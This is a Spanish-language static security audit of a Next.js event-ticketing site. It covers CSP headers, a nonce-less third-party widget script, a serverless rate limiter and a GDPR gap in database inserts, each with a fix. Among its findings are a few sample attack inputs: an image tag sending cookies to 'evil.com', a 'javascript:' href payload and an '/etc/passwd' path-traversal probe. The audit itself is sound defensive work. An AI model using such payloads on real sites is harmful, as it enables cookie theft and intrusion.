# Security Audit — Solaris Nerja

**Fecha:** 2026-03-06
**Scope:** Next.js 16 production app — XSS, script injection, CSP, env vars, DB queries, URL handling, third-party scripts
**Archivos analizados:** 28 archivos en 10 categorías
**Metodología:** Revisión estática de código fuente, sin pentest dinámico

---

## 1. Hechos observables

| Área | Estado |
|------|--------|
| Framework | Next.js 16 + React 19, App Router, TypeScript strict |
| DB | PostgreSQL via `pg` Pool, queries parametrizadas |
| Validación | AJV JSON Schema 2020-12, `additionalProperties: false` |
| CSP | Nonce-based en middleware, per-request generation |
| Headers de seguridad | HSTS preload, X-Frame-Options DENY, nosniff, Permissions-Policy |
| CORS | Whitelist explícita, preflight gestionado |
| Rate limiting | In-memory Map, 20 req/min por IP |
| Secrets | `.env.local` en `.gitignore`, NO trackeado por git ✓ |
| Error responses | RFC 7807 `application/problem+json` |
| Cookie consent | SameSite=Lax, Secure flag, accept/reject |

---

## 2. Vulnerabilidades Críticas

### CRIT-01: TicketmasterWidget — innerHTML + script injection sin nonce CSP

**Archivo:** `src/ui/components/TicketmasterWidget.tsx:33-34`

```typescript
node.innerHTML = ""              // Wipe container
node.appendChild(script)         // Inject <script> without nonce
```

**Riesgo:** El script se crea con `document.createElement("script")` y se inyecta al DOM sin nonce CSP. Aunque `script.src` apunta a `widget.ticketmaster.com` (dominio en CSP whitelist), el patrón tiene dos problemas:

1. **innerHTML como vector:** `innerHTML = ""` es benigno aquí porque el string es hardcoded vacío. Pero el patrón establece un precedente inseguro. Si en el futuro algún dato dinámico se interpola, se abre XSS.
2. **Script sin nonce:** El script dinámico no lleva `nonce` attribute. Funciona solo porque `widget.ticketmaster.com` está en `script-src`. Si CSP se endureciera a `strict-dynamic`, este widget se rompería silenciosamente.

**CVSS estimado:** 4.3 (Medium — no explotable ahora, pero frágil ante cambios)

**Fix:**
```typescript
script.nonce = document.querySelector('meta[name="csp-nonce"]')?.getAttribute('content') ?? ''
// O pasar nonce como prop desde Server Component
```

### CRIT-02: CSP connect-src no incluye Sentry

**Archivo:** `src/middleware.ts:72`

```typescript
"connect-src 'self' https://www.google-analytics.com https://www.facebook.com",
```

**Riesgo:** Sentry client SDK (`sentry.client.config.ts`) envía eventos a `https://*.ingest.de.sentry.io`. Ese dominio NO está en `connect-src`. Resultado: **CSP bloquea silenciosamente todos los reportes de errores en producción**. El equipo cree que Sentry funciona, pero no recibe datos.

**CVSS estimado:** 0 (no es vulnerabilidad directa, pero elimina observabilidad de seguridad)

**Fix:**
```typescript
"connect-src 'self' https://www.google-analytics.com https://www.facebook.com https://*.ingest.de.sentry.io",
```

### CRIT-03: lead-repository INSERT no persiste ip_address ni consent_given

**Archivo:** `src/adapters/db/lead-repository.ts:7-14`

```sql
INSERT INTO leads (id, email, event_id, created_at)
VALUES ($1, $2, $3, $4)
```

**Riesgo:** Si la tabla tiene columnas `ip_address` y `consent_given` (probables para GDPR), el INSERT las omite. Consecuencias:

1. **GDPR Art. 7.1:** No se puede demostrar base legal del consentimiento.
2. **Forense:** No hay trazabilidad IP-timestamp para investigar abuso.
3. **Regulatorio:** Multa potencial hasta 4% facturación anual bajo GDPR.

**CVSS estimado:** N/A (riesgo regulatorio, no técnico)

**Fix:** Añadir columnas al INSERT. Pasar `ip` y `consentGiven` desde la API route al domain y al repository.

---

## 3. Riesgos Medium

### MED-01: Rate limiter in-memory inefectivo en Vercel serverless

**Archivo:** `src/lib/rate-limit.ts`

**Problema:** `const store = new Map<string, Entry>()` vive en memoria del proceso. En Vercel, cada invocación puede ejecutarse en una instancia diferente. Un atacante puede enviar 20×N requests si hay N instancias activas.

**Impacto:** Rate limiting es decorativo en producción serverless. Un bot puede registrar miles de leads en minutos.

**Fix:** Migrar a Vercel KV, Upstash Redis, o rate-limit a nivel de Vercel Edge Config.

### MED-02: `eventId` sin validación de formato en ruta dinámica

**Archivo:** `src/app/eventos/[eventId]/page.tsx:15-16`

```typescript
const { eventId } = await params
const event = getEvent(eventId)
```

`getEvent` hace `.find(e => e.id === eventId)` contra un array estático. No hay inyección SQL (no va a DB), pero:

1. **Log injection:** `eventId` arbitrario llega a logs via `TicketmasterWidget` → `trackEvent("ticket_widget_view", { eventId })`. Un `eventId` con `\n` o caracteres especiales podría corromper logs estructurados.
2. **Sin validación de tipo:** Cualquier string pasa. No hay regex ni enum check antes de `getEvent`.

**Fix:** Validar `eventId` contra `EventId` type o un Set de IDs válidos antes de cualquier operación.

### MED-03: `ticketUrl` renderizado como href sin sanitización

**Archivo:** `src/app/eventos/[eventId]/page.tsx:62`

```tsx
<ButtonPrimary href={event.ticketUrl}>Comprar Tickets</ButtonPrimary>
```

Y en `TicketmasterWidget.tsx:65`:

```tsx
<a href={ticketUrl} target="_blank" rel="noopener noreferrer">
```

`ticketUrl` viene de `config/events.ts` (hardcoded). **Actualmente seguro.** Pero si en el futuro los eventos se cargan de DB o CMS, un `ticketUrl` de tipo `javascript:alert(1)` sería XSS directo.

**Fix preventivo:** Validar que `ticketUrl` empiece por `https://` antes de renderizar.

### MED-04: style-src permite `'unsafe-inline'`

**Archivo:** `src/middleware.ts:69`

```typescript
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
```

`'unsafe-inline'` en `style-src` permite inyección de CSS arbitrario. Un atacante con XSS limitado puede exfiltrar datos vía CSS (attribute selectors + background-url). Esto es común en frameworks con CSS-in-JS, pero Tailwind no lo requiere.

**Fix:** Investigar si `'unsafe-inline'` se puede eliminar. Tailwind genera clases en build time, no inline styles. Las únicas inline styles son los radial-gradient en componentes de sección.

### MED-05: Nonce generado pero no propagado a componentes

**Archivo:** `src/middleware.ts:95`

```typescript
response.headers.set("x-nonce", nonce)
```

El nonce se genera y se pasa via header, pero `layout.tsx` no lo lee. Ningún `<script>` inline en la app usa `nonce`. `SecureScript` component existe pero no consume nonce. El sistema de nonces es scaffolding sin efecto real.

**Fix:** En `layout.tsx`, leer `headers().get("x-nonce")` y pasar a `<Script nonce={nonce}>` para cualquier inline script.

### MED-06: `img-src` excesivamente permisivo

**Archivo:** `src/middleware.ts:71`

```typescript
"img-src 'self' data: https:",
```

`https:` permite cargar imágenes desde CUALQUIER dominio HTTPS. Un atacante con XSS podría usar `<img src="https://evil.com/track?cookie=...">` para exfiltrar datos vía pixel tracking.

**Fix:** Restringir a dominios conocidos:
```typescript
"img-src 'self' data: https://www.solarisnerja.com https://maps.googleapis.com",
```

---

## 4. Safe Improvements (Low Risk)

### LOW-01: Honeypot response idéntica a success

```typescript
// Honeypot triggered
return NextResponse.json({ success: true })
// Normal success
return NextResponse.json({ success: true })
```

Correcto. Un bot no puede distinguir honeypot de éxito real. ✓

### LOW-02: Añadir `X-DNS-Prefetch-Control: off`

Evita DNS prefetch que puede revelar intenciones de navegación al ISP. Coste zero.

### LOW-03: Añadir header `Cross-Origin-Opener-Policy: same-origin`

Protege contra ataques tipo Spectre en browsers modernos. Requerido para `SharedArrayBuffer` pero también mejora aislamiento.

### LOW-04: Añadir header `Cross-Origin-Embedder-Policy: require-corp`

Complementa COOP. Nota: puede romper embeds de terceros (Ticketmaster iframe, Google Maps). Evaluar antes de activar.

### LOW-05: `readyz` endpoint leak de error names en dev

**Archivo:** `src/app/api/readyz/route.ts:27`

```typescript
detail: isDev ? `Database not ready: ${name}: ${message}` : "Database not ready",
```

Correcto — solo en dev. En producción el detail es genérico. ✓ Pero verificar que `NODE_ENV` siempre sea `production` en Vercel (es así por defecto).

### LOW-06: Cookie SameSite=Lax vs Strict

```typescript
document.cookie = `${COOKIE_KEY}=${value}; path=/; max-age=${maxAge}; SameSite=Lax; Secure`
```

`SameSite=Lax` es adecuado para cookies de preferencia. `Strict` sería más seguro pero podría causar problemas con links externos. Aceptable. ✓

### LOW-07: Pool max connections = 5

```typescript
pool = new Pool({ connectionString, max: 5 })
```

Adecuado para Vercel serverless. Cada instancia tiene pool pequeño. Si se migra a servidor persistente, revisar. ✓

---

## 5. Matriz de Riesgo

| ID | Severidad | Explotable ahora | Esfuerzo fix | Prioridad |
|----|-----------|-------------------|-------------|-----------|
| CRIT-01 | Medium | No (src hardcoded) | 30 min | P2 |
| CRIT-02 | High (ops) | Sí (Sentry ciego) | 5 min | **P0** |
| CRIT-03 | High (legal) | Sí (GDPR gap) | 2h | **P0** |
| MED-01 | Medium | Sí (bypass trivial) | 2h | P1 |
| MED-02 | Low | Edge case | 15 min | P2 |
| MED-03 | Low | No (data estática) | 10 min | P3 |
| MED-04 | Medium | Solo con XSS previo | 1h | P2 |
| MED-05 | Low | No (sin inline scripts) | 1h | P3 |
| MED-06 | Medium | Solo con XSS previo | 5 min | P1 |

---

## 6. Checklist de Verificación

- [ ] CSP `connect-src` incluye `*.ingest.de.sentry.io` → verificar en Sentry dashboard que llegan eventos
- [ ] `lead-repository.ts` INSERT incluye `ip_address, consent_given` → verificar con `SELECT * FROM leads LIMIT 1`
- [ ] TicketmasterWidget script lleva nonce → inspeccionar DOM en DevTools, verificar no hay CSP violation en console
- [ ] `img-src` restringido a dominios conocidos → verificar que logo, maps y imágenes cargan correctamente
- [ ] Rate limiter migrado a Upstash/KV → test con `ab -n 100 -c 10` desde dos IPs
- [ ] `eventId` validado contra Set de IDs → probar `/eventos/../../etc/passwd` devuelve 404

---

## 7. Riesgos Residuales

1. **Supply chain:** `widget.ticketmaster.com` es trusted CDN, pero si Ticketmaster sufre un compromiso, el script tiene acceso completo al DOM del widget container. Mitigación: iframe sandbox (ya usa `frame-src`, pero el widget JS se carga fuera del iframe).
2. **Sentry Replay:** `replaysOnErrorSampleRate: 1.0` graba sesiones completas al ocurrir un error. Puede capturar PII (emails en formularios). Considerar scrubbing rules en Sentry dashboard.
3. **Google Maps iframe:** Carga contenido de terceros sin `sandbox` attribute en el iframe. Google Maps funcionalidad requiere scripts, pero añadir `sandbox="allow-scripts allow-same-origin"` limita capabilities.

---

## 8. Siguientes 3 Acciones

1. **[5 min] Fix CRIT-02:** Añadir `https://*.ingest.de.sentry.io` a `connect-src` en middleware.ts. Verificar en Sentry que llegan eventos.
2. **[2h] Fix CRIT-03:** Añadir `ip_address` y `consent_given` al flujo completo: types.ts → create-lead.ts → lead-repository.ts → route.ts. Verificar con query directa a DB.
3. **[5 min] Fix MED-06:** Restringir `img-src` a dominios específicos. Verificar que todas las imágenes siguen cargando.
